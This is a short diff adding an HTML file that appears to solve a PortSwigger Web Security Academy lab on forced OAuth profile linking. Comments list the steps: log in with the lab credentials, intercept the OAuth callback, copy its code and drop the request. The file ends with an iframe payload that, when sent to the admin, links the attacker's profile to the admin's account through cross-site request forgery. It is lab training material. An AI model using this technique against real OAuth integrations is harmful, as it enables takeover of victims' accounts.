@@ -1,0 +1,14 @@
+<!--Simple iframe payload to solve the following lab:-->
+<!--https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking-->
+
+<!--Steps Before Payload Can Be Crafted:-->
+<!--Log in as wiener:peter-->
+<!--Click link to connect to social media-->
+<!--Before logging in to OAuth service, begin interception of requests-->
+<!--Log into OAuth service with the following credentials peter.wiener:hotdog-->
+<!--Keep intercepting requests until you see a GET request that looks similar to the following: -->
+<!--GET /oauth-linking?code=m1UGhrDKoCEuAbYzKhS HTTP/2-->
+<!--Copy the code and DROP THE REQUEST-->
+<!--send the following payload to the admin:-->
+
+<iframe src="https://insert_lab_sub_domain_here.web-security-academy.net/oauth-linking?code=insert_code_here"></iframe>
